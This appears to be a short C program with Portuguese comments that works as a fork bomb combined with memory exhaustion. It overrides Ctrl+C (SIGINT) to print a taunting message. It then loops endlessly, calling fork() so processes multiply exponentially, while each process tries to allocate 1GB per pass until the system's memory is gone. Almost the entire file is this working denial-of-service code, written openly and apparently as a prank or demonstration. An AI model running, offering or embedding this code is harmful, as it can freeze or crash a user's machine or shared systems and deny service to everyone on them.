#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Função de resposta quando o sinal SIGINT for enviado (apertar Ctrl + C no terminal)
void handler(int sig) 
{
    puts("\nTa achando que vai se livrar de mim assim fácil??? HUEHUEHUEBRBR");
}

int main(int argc, char** argv)
{
    signal(SIGINT, handler); // Sobreescrevendo o compotamento padrão do SIGINT 
    char* wastedMemory; // Ponteiro pra armazenar alocações de memória

    while(1){
        fork(); // Cada processo vai criando novos processos, de maneira exponencial

	/************************************************************************** 
	 * Cada processo vai tentar alocar 1GB de memória a cada passada do while *
	 * até que toda a memória do computador tenha sido alocada                *
	 **************************************************************************/
        wastedMemory = malloc(1024 * 1024 * 1024 * sizeof(char));
    }

    exit(0);
}
